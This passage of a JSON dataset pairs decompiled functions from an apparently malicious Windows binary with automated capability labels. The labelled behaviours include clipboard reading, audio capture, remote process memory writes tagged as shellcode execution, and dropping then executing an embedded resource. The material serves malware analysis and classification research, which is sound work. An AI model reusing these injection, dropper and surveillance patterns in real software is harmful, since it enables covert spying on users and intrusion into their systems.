        "decompiled_code": "\nvoid __fastcall fcn.00427290(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00404650();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.00404864();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.00404864();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0044d830": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d830(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 8) = *(param_2 + 8);\n    *(in_EAX + 0xc) = *(param_2 + 0xc);\n    *(in_EAX + 0x10) = *(param_2 + 0x10);\n    *(in_EAX + 0x14) = *(param_2 + 0x14);\n    *(in_EAX + 0x18) = *(param_2 + 0x18);\n    *(in_EAX + 0x1c) = *(param_2 + 0x1c);\n    *(in_EAX + 0x28) = *(param_2 + 0x28);\n    *(in_EAX + 0x2c) = *(param_2 + 0x2c);\n    *(in_EAX + 0x30) = *(param_2 + 0x30);\n    *(in_EAX + 0x34) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 255
    },
    "00454aa0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454aa0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.00408584(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x1b4) = uVar1;\n    return;\n}\n",
        "token_count": 155
    },
    "00466bc8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * fcn.00466bc8(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.00402f00();\n    fcn.00466140();\n    uVar2 = fcn.00402f00();\n    *puVar1 = uVar2;\n    puVar1[1] = *(in_EAX + 0xc);\n    puVar1[2] = 0;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    iVar3 = sub.winmm.dll_waveInPrepareHeader(*(in_EAX + 0x94), puVar1, 0x20);\n    if (iVar3 == 0) {\n        sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), puVar1, 0x20);\n    }\n    return puVar1;\n}\n",
        "token_count": 214
    },
    "00403770": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00403770(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00403af4();\n    *(in_EAX + 0x14) = in_EAX + 0x14c;\n    *(in_EAX + 4) = 0xd7b0;\n    *(in_EAX + 6) = *0x492034;\n    *(in_EAX + 8) = 0x80;\n    *(in_EAX + 0x18) = 0x4035c4;\n    uVar1 = fcn.0040580c();\n    fcn.004059dc(uVar1);\n    fcn.004030fc();\n    iVar2 = fcn.0040580c();\n    *(in_EAX + 0x48 + iVar2) = 0;\n    return 0;\n}\n",
        "token_count": 200
    },
    "004052cc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.004052cc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x492000;\n    *0x492000 = 0;\n    puVar3 = *0x4987c8;\n    puVar4 = 0x4987c8;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 170
    },
    "0040f768": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f768(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x14), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 55
    },
    "0042730c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042730c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x427327;\n        iVar1 = fcn.00404528();\n        piStack24 = 0x42732c;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x427339;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x42734b;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404864();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x427363;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404864();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x42739c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00404650();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 379
    },
    "0042c2dc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c2dc(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x42c3cc;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_14h = 0;\n    fcn.0040700c();\n    iVar1 = sub.oleaut32.dll_GetErrorInfo();\n    if (iVar1 == 0) {\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x10))();\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x14))();\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x18))();\n        uStack96 = 0;\n        uStack100 = 0x42c359;\n        (**(_pe_dos_header + 0x1c))();\n    }\n    fcn.004057d4();\n    fcn.004057d4();\n    fcn.004057d4();\n    iStack104 = fcn.0042bc78(var_14h, var_1ch, var_18h, in_EAX);\n    uStack108 = var_14h;\n    if (iStack104 == 0) {\n        iStack104 = fcn.00405470();\n        uStack108 = var_14h;\n    }\n    uStack96 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x496014)(0xeedfade, 1, 7, &stack0xffffff94);\n    return;\n}\n",
        "token_count": 530
    },
    "00431684": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431684(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x431698;\n    (**(*in_EAX + 0x18))();\n    uStack28 = 0x4316dc;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(2);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x4316e3);\n    return;\n}\n",
        "token_count": 216
    },
    "004316ec": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004316ec(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4316ff;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x431741;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(3);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x431748);\n    return;\n}\n",
        "token_count": 214
    },
    "0045b210": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b210(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.0045a6d8();\n    fcn.0045aa70();\n    return;\n}\n",
        "token_count": 434
    },
    "0044dcb8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044dcb8(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f) < (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f)) {\n        return in_EAX;\n    }\n    return param_2;\n}\n",
        "token_count": 109
    },
    "00474e18": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "write process memory"
        ],
        "decompiled_code": "\nulong fcn.00474e18(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    uVar1 = sub.kernel32.dll_VirtualAllocEx();\n    sub.kernel32.dll_WriteProcessMemory();\n    return CONCAT44(in_EAX, uVar1);\n}\n",
        "token_count": 61
    },
    "0040f758": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f758(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x10), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 55
    },
    "0041f720": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0041f720(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x49a9b8);\n    if (iVar1 == 0) {\n        fcn.0041f714();\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0048eb90": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0048eb90(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x48ebe2;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    do {\n        fcn.00473610();\n        fcn.004835dc();\n        uStack20 = 10000;\n        sub.kernel32.dll_Sleep_2();\n    } while( true );\n}\n",
        "token_count": 145
    },
    "00410064": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410064(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_10h == 0x400) {\n        uVar1 = sub.oleaut32.dll_VariantChangeType(arg_8h, arg_ch, arg_14h, arg_18h);\n    }\n    else {\n        uVar1 = 0x80004001;\n    }\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "0041e990": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e990(uint param_1)\n\n{\n    fcn.0041d004(param_1);\n    fcn.00405620();\n    fcn.00405a3c();\n    fcn.0041d004();\n    return;\n}\n",
        "token_count": 60
    },
    "00420300": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420300(uint param_1, int32_t *param_2)\n\n{\n    uint var_4h;\n    \n    (**(*param_2 + 4))(0x4200c0);\n    (**(*param_2 + 4))(0x4200cc);\n    return;\n}\n",
        "token_count": 69
    },
    "004251d4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004251d4(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.0042579c();\n    fcn.0042579c();\n    sub.gdi32.dll_StretchBlt\n              (in_EAX[1], *in_EDX, in_EDX[1], in_EDX[2] - *in_EDX, in_EDX[3] - in_EDX[1], *(in_ECX + 4), *arg_8h, \n               arg_8h[1], arg_8h[2] - *arg_8h, arg_8h[3] - arg_8h[1], in_EAX[8]);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 215
    },
    "004256e4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004256e4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) != 0) && (*(in_EAX + 8) != (~*0x425740 & *(in_EAX + 8)))) {\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x49aa08);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x49aa0c);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x49aa10);\n        *(in_EAX + 8) = ~*0x425740 & *(in_EAX + 8);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00425868": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00425868(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.00424cac();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x492e20));\n    return;\n}\n",
        "token_count": 107
    },
    "00425f00": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00425f00(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "004382cc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004382cc(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    if (*0x438304 == (*0x438300 & *(in_EAX + 7))) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00448c04": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448c04(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00448c2c(arg_8h & 0xff, *(in_EAX + 0x43), *(in_EAX + 0x40), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 89
    },
    "00448c2c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448c2c(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004485d0();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x30))(arg_8h, *((arg_10h & 0xff) * 4 + 0x49362c) | *((arg_ch & 0xff) * 4 + 0x49363c), arg_18h);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "004598cc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004598cc(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x49ac72);\n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x49ac70);\n    return;\n}\n",
        "token_count": 78
    },
    "00485684": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint fcn.00485684(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetSystemMetrics(0);\n    iVar2 = sub.user32.dll_GetSystemMetrics(1);\n    if ((iVar1 != *(in_EAX + 0x60)) || (iVar2 != *(in_EAX + 100))) {\n        *(in_EAX + 0x68) = 0;\n        *(in_EAX + 0x60) = iVar1;\n        *(in_EAX + 100) = iVar2;\n        (**(**(in_EAX + 0x54) + 0x40))();\n        (**(**(in_EAX + 0x54) + 0x34))();\n        (**(**(in_EAX + 0x58) + 0x40))();\n        (**(**(in_EAX + 0x58) + 0x34))();\n        fcn.0042a8dc();\n        fcn.0042a8dc();\n        fcn.0042a8dc();\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 276
    },
    "0048c624": {
        "rules": [
            "create or open file",
            "create process on Windows",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048c624(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack48 = 0x48c718;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407a30(0, arg_10h, arg_ch);\n    fcn.0048a3f0(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405728(&var_ch);\n    fcn.00405818();\n    uVar2 = fcn.004059dc();\n    uVar2 = func_0x00407960(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    fcn.0048a3f0(0, 0, 5);\n    fcn.00405728(&var_14h);\n    fcn.00405818();\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    func_0x0040ff4c(0, 0x48c72c, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48c71f);\n    return;\n}\n",
        "token_count": 516
    },
    "0048cce4": {
        "rules": [
            "create or open file",
            "create thread",
            "write file on Windows",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048cce4(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    uStack56 = 0x48cdfc;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407a30(0, arg_10h, arg_ch);\n    fcn.0048a3f0(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405728(0);\n    fcn.004058e0(0x48ce18, 0);\n    uVar2 = fcn.004059dc();\n    uVar2 = func_0x00407960(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 4);\n    fcn.0048a3f0();\n    fcn.00405728(0);\n    fcn.004058e0(0x48ce18, 0);\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.0048cc34, uVar1, 0, &var_ch);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x48ce03);\n    return;\n}\n",
        "token_count": 543
    },
    "0046e3ad": {
        "rules": [
            "create or open registry key",
            "create or open registry key",
            "delete registry key"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e3ad(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    char unaff_BL;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    \n    *0x3d0046e4 = *0x3d0046e4 + unaff_BL;\n    in(0x46);\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + unaff_BL;\n    *(unaff_EBP + 0x6850f445) = *(unaff_EBP + 0x6850f445) + param_1;\n    *unaff_EDI = *unaff_EDI + param_1;\n    *param_2 = *param_2 + (param_1 >> 8);\n    uVar1 = fcn.004059dc();\n    sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n    sub.advapi32.dll_RegDeleteKeyA(*(unaff_EBP + -0xc), 0x46e4b8);\n    uVar1 = *(unaff_EBP + -0xc);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x46e4b4);\n    return;\n}\n",
        "token_count": 324
    },
    "0047edbc": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047edbc(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    float10 fVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint *arg_8h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *0x495cc0;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    _var_10h = CONCAT44(unaff_EBX, unaff_ESI);\n    _var_18h = CONCAT44(&stack0xfffffffc, 0x47efc0);\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047edbc::var_1ch;\n    var_20h = **0x495b5c;\n    var_24h = 0x47edf0;\n    fcn.0048c77c();\n    var_24h = var_1ch;\n    var_28h = 0x47ee00;\n    fcn.00473610();\n    var_28h = 0x47ee0b;\n    fcn.00409b84();\n    var_28h = var_20h;\n    var_2ch = 0x47ee1d;\n    fcn.004058e0();\n    **0x495a78 = 0;\n    uVar3 = 1;\n    **0x495bb0 = 0;\n    var_2ch = 0x47ee3b;\n    fcn.00473610();\n    var_2ch = 0x47ee48;\n    fcn.00405974();\n    if (uVar3) {\n        var_2ch = *0x495c30;\n        sub.kernel32.dll_CreateThread_1(0, 0, 0x4822f8, 0, 0);\n        **0x4958f8 = 1;\n    }\n    **0x4958b4 = 1;\n    arg_8h = &fcn.0047edbc::var_2ch;\n    fcn.0040ef4c(arg_8h, *0x47effc);\n    fcn.00405584();\n    (**(***0x495808 + 0x2c))();\n    fcn.0048c7a4();\n    fcn.00405584();\n    fcn.00405974();\n    if (uVar3) {\n        fVar4 = fcn.0040bca0();\n        _var_10h = fVar4;\n        var_ch = _var_10h >> 0x20;\n        fcn.0040c900(var_10h, var_ch);\n        fVar4 = fcn.0040bccc();\n        _var_18h = fVar4;\n        var_14h = _var_18h >> 0x20;\n        fcn.0040c900(var_18h, var_14h);\n        fcn.004058e0(var_8h, 0x47f030, var_4h);\n    }\n    iVar2 = fcn.0041f9e0();\n    **0x495d1c = iVar2;\n    *(**0x495d1c + 0xf) = 1;\n    fcn.0041fbec();\n    fcn.0041fe9c();\n    while( true ) {\n        uVar6 = 0;\n        puVar5 = puVar1;\n        iVar2 = sub.user32.dll_GetMessageA(puVar1, 0, 0, 0);\n        if (iVar2 == 0) break;\n        sub.user32.dll_TranslateMessage(puVar1);\n        arg_8h = puVar1;\n        sub.user32.dll_DispatchMessageA();\n    }\n    *in_FS_OFFSET = puVar5;\n    fcn.00405554(0x47efc7, uVar6, arg_8h);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1069
    },
    "00411c50": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411c50(uint16_t param_1, uint16_t *param_2)\n\n{\n    if ((*param_2 & 0xfff) < 0x14) {\n        if ((param_1 & 0xfff) < 0x14) {\n            (***0x495be4)();\n            fcn.004112a0();\n        }\n        else {\n            fcn.00410e60();\n        }\n    }\n    else {\n        fcn.00411d3c();\n        (***0x495be4)();\n        fcn.004112a0();\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00430ecc": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00430ecc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x430ef6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 125
    },
    "004487a8": {
        "rules": [
            "PEB access"
        ],
